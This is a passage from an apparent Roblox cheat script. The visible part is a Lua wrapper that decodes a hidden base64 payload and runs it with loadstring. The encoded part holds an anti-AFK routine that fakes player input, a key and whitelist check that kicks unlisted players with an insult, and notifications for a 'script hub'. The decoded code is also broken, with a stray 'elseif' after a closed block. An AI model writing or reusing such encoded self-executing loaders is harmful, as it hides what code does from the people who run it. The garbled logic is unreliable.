YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIF9HLnRpbWVyQUZLIGRvCiAgICAgICAgICAgICAgICAgICAgc2Vjb25kcyA9IHNlY29uZHMgKyAxCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgICAgICAgICAgICAgaWYgc2Vjb25kcyA+PSA2MCB0aGVuIHNlY29uZHMgPSAwOyBtaW51dGVzID0gbWludXRlcyArIDEgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgbWludXRlcyA+PSA2MCB0aGVuIG1pbnV0ZXMgPSAwOyBob3VycyA9IGhvdXJzICsgMSBlbmQKICAgICAgICAgICAgICAgICAgICBUaW1lckxhYmVsLlRleHQgPSBzdHJpbmcuZm9ybWF0KCIlMDJkOiUwMmQ6JTAyZCIsIGhvdXJzLCBtaW51dGVzLCBzZWNvbmRzKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIEFudGktQUZLIGZ1bmN0aW9uCiAgICAgICAgICAgIGxvY2FsIHZ1ID0gZ2FtZTpHZXRTZXJ2aWNlKCdWaXJ0dWFsVXNlcicpCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5JZGxlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHZ1OkNhcHR1cmVDb250cm9sbGVyKCkKICAgICAgICAgICAgICAgIHZ1OkNsaWNrQnV0dG9uMihWZWN0b3IyLm5ldygpKQogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIAogICAgICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgICAgIFRpdGxlID0gIkFudGkgQUZLIiwKICAgICAgICAgICAgICAgIERlc2MgPSAiQW50aSBBRksgYWN0aXZhdGVkIHdpdGggYW5pbWF0ZWQgdGltZXIhIiwKICAgICAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgICAgIH0pCiAgICAgICAgZWxzZQogICAgICAgICAgICAtLSBUdXJuIG9mZgogICAgICAgICAgICBfRy5kaXNwbGF5QUZLID0gZmFsc2UKICAgICAgICAgICAgX0cudGltZXJBRksgPSBmYWxzZQogICAgICAgICAgICBfRy5hbmltYXRlR3JhZGllbnRzID0gZmFsc2UKICAgICAgICAgICAgaWYgZ2FtZS5Db3JlR3VpOkZpbmRGaXJzdENoaWxkKCJBbnRpQUZLRGlzcGxheSIpIHRoZW4KICAgICAgICAgICAgICAgIGdhbWUuQ29yZUd1aS5BbnRpQUZLRGlzcGxheTpEZXN0cm95KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICAgICAgVGl0bGUgPSAiQW50aSBBRksiLAogICAgICAgICAgICAgICAgRGVzYyA9ICJBbnRpIEFGSyBkZWFjdGl2YXRlZCEiLAogICAgICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICAgICAgfSkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKV2luZG93Ok5vdGlmeSh7CiAgICBUaXRsZSA9ICLwn46JIERZTEFOIFNPIEZJTkUgU0NSSVBUIC0gQ09NUExFVEUhIiwKICAgIERlc2MgPSAiQWxsIDExIHRhYnMgbG9hZGVkIHN1Y2Nlc3NmdWxseSEgRW5qb3kgeW91ciB1bHRpbWF0ZSBTY3JpcHQh8J+agCIsCiAgICBUaW1lID0gMTAKfSkKCmVsc2VpZiBub3QgaXNXaGl0ZWxpc3RlZCB0aGVuCiAgICAgICAgLS0gTm90IHdoaXRlbGlzdGVkIC0gU0hSSU5LIFRPIExPQURJTkcgQk9YCiAgICAgICAgc2hyaW5rSW50b0xvYWRpbmdCb3goKQogICAgICAgIAogICAgICAgIC0tIFN0YXJ0IGxvYWRpbmcgYW5pbWF0aW9uCiAgICAgICAgYW5pbWF0ZUxvYWRpbmdCYXIoKQogICAgICAgIAogICAgICAgIC0tIFdhaXQgZm9yIGxvYWRpbmcgdG8gY29tcGxldGUKICAgICAgICB3YWl0KDAuNSkKICAgICAgICAKICAgICAgICAtLSBTaG93IGZpbmFsIHJlc3VsdAogICAgICAgIGxvYWRpbmdUZXh0LlRleHQgPSAi4p2MIE5vdCBXaGl0ZWxpc3RlZCAtIEtpY2tpbmcuLi4iCiAgICAgICAgbG9hZGluZ1RleHQuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMTAwLCAxMDApCiAgICAgICAgcGVyY2VudGFnZVRleHQuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMTAwLCAxMDApCiAgICAgICAgCiAgICAgICAgd2FpdCgxLjUpCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyOktpY2soIlVNQVNBIEtBQkE/IFRBTkdBIEtBIEVIIikKICAgICAgICAKICAgIGVsc2UKICAgICAgICAtLSBXaGl0ZWxpc3RlZCBidXQgd3Jvbmcga2V5IC0gV1JPTkcgS0VZIFNIQUtFCiAgICAgICAgc3RhdHVzLlRleHQgPSAi4p2MIEludmFsaWQga2V5ISIKICAgICAgICBzdGF0dXMuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMTUwLCA1MCkKICAgICAgICAKICAgICAgICAtLSBBbmltYXRlIHdhcm5pbmcgd2l0aCBzaGFrZQogICAgICAgIGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIik6Q3JlYXRlKHN1Ym1pdEJ0biwgVHdlZW5JbmZvLm5ldygwLjUpLCB7QmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMTUwLCA1MCl9KTpQbGF5KCkKICAgICAgICBzaGFrZUZyYW1lKCkKICAgICAgICAKICAgICAgICAtLSBSZXNldCBhZnRlciAxLjUgc2Vjb25kcwogICAgICAgIHdhaXQoMS41KQogICAgICAgIHN0YXR1cy5UZXh0ID0gIiIKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlR3ZWVuU2VydmljZSIpOkNyZWF0ZShzdWJtaXRCdG4sIFR3ZWVuSW5mby5uZXcoMC41KSwge0JhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMjEsIDI0LCAyNCl9KTpQbGF5KCkKICAgIGVuZAplbmQKCi0tIENvbm5lY3QgYnV0dG9uCnN1Ym1pdEJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KHZlcmlmeUtleSkKCi0tIEVudGVyIGtleSB0byBzdWJtaXQKa2V5Qm94LkZvY3VzTG9zdDpDb25uZWN0KGZ1bmN0aW9uKGVudGVyUHJlc3NlZCkKICAgIGlmIGVudGVyUHJlc3NlZCB0aGVuCiAgICAgICAgdmVyaWZ5S2V5KCkKICAgIGVuZAplbmQp" local __map={};(function() local chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' for i=1,#chars do __map[string.sub(chars,i,i)]=i-1 end end)() local out={};local i=1;while i<=#__b do local c1=__map[string.sub(__b,i,i)];local c2=__map[string.sub(__b,i+1,i+1)];local c3=__map[string.sub(__b,i+2,i+2)];local c4=__map[string.sub(__b,i+3,i+3)];if not c1 then break end;c2=c2 or 0;c3=c3 or 0;c4=c4 or 0;local n=c1*262144+c2*4096+c3*64+c4;local b1=math.floor(n/65536)%256;local b2=math.floor(n/256)%256;local b3=n%256;out[#out+1]=string.char(b1);if string.sub(__b,i+2,i+2)~='=' then out[#out+1]=string.char(b2) end;if string.sub(__b,i+3,i+3)~='=' then out[#out+1]=string.char(b3) end;i=i+4 end;local decoded=table.concat(out) local ok,err=pcall(function() local loader=loadstring or load;local f=loader(decoded);if type(f)=='function'then f() end end) if not ok then pcall(function() print('Wrapper error: '..tostring(err)) end) end end)()
